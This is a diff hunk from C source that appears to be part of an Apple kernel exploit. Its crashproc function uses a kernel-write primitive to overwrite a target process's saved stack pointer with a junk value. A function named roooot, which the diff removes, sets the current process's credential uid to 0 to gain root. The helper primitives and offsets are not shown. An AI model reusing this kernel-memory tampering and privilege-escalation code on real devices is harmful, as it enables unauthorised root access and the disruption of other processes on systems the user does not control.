@@ -854,12 +854,4 @@ int crashproc(const char* name) {
     ds_kwrite64(state + offsetof(struct arm_saved_state64, sp), 0x1337133713371337);
     return 0;
 }
-
-void roooot(void) {
-    uint64_t proc = ourproc();
-    uint64_t ucred = sbx_ucredbyproc(proc);
-    uint64_t addr = ucred + off_ucred_cr_uid;
-
-    ds_kwrite32(addr, 0);
-}
       
